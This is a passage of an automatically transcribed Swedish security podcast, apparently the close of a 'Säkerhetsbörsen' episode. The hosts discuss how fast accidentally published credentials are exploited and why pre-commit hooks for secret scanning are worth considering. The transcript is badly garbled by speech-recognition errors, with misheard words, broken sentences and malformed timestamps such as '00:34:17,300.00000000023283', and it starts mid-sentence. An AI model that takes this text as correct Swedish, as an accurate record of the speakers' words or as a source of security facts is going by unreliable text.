är backet så lätt annat nu Nu har jag inte upp Eh jag har inte upp artikeln Jag kan ta upp den men alltså eh tesen var ju de testade i olika flöden eh och fick mätvärlden på hur snabbt vi gick det och så för olika så att de har De har ju grafer och sånt Men men själva huvudet är så ner

### 63 00:31:37,400 --> 00:32:29,700
Det går rätt jävla snabbt från det att jag fuckat upp och råka publicera dina creditions till det att någon är där och knackar så att så det var ju väldigt spännande som man tänker då att man är så duktig så att man liksom oj oj det fuckade upp och sen vecka senare har man märkt det här man har feilat sin Bugg och man har till och med genomfört det då då liksom internet hur ni tackar dig i ett par tusen gånger om lösningen är ju bara inte gör fel från början Det Det diskuterade SJ i i bland annat någon utvecklar kanalen hatade på alla såna här pre-kommit Hook så hävdar att man ska skjuta folk som som rekommenderar prekumins eh Där tog han just upp att a till enda valida ljus case ett

### 64 00:32:30,200 --> 00:33:10,400
eller han gick inte helt med den här utvecklingen på att det var lite ljusterat men han gjorde att det är liksom ändå så här Det är inte motiverande att döda när den personen som föreslår det det är just för eh för gesekretning Secret scanning att det är där han ändå kan förstå us-caset för att eh nästan allt annat så är det rimliga att säga kinesystemet upptäckad Då funkade upp och sen säger till dig men just för Secret lik så kan till och med hardcore utvecklare kan förstå hur du tänker när du tycker att det borde ligga i en rekommit och

### 65 00:33:10,900 --> 00:33:29,400
använder inte att de hatar folk som rekommenderar på det kommit såg att du sa bara ju all form av produktivitet plus att du förlita dig på ett lokala utveckla miljöer kolla saker som sägs i systemgården kolla Eh Men preco min tok för säkerhetscanning

### 66 00:33:30,900 --> 00:33:44,100
eh Vi är säkerhetsnördare är väl typ positiva och det är i alla fall någonting man borde över väga just för att Eh det är ju ganska final när du har publicerat dina hemligheter så är du ett jobbigt läge

### 67 00:33:45,600 --> 00:33:53,600
preco mitt hoc så kan du få veta att du har gjort bort dig innan du har kommit att vinna några pushat

### 68 00:33:54,700 --> 00:33:55,500
Nej nu Bättre

### 69 00:34:07,100 --> 00:34:17,300.00000000023283
novell där så har vi knyter upp säcken för det här avsnittet av säkerhetsbörsen jag som pratade till Johan Rydberg Möller med mig hade jag rycka Bokfors idag

### 70 00:34:27,699.9999999997672 --> 00:34:43,300.00000000023283
de har De har pillat dem lite quickly
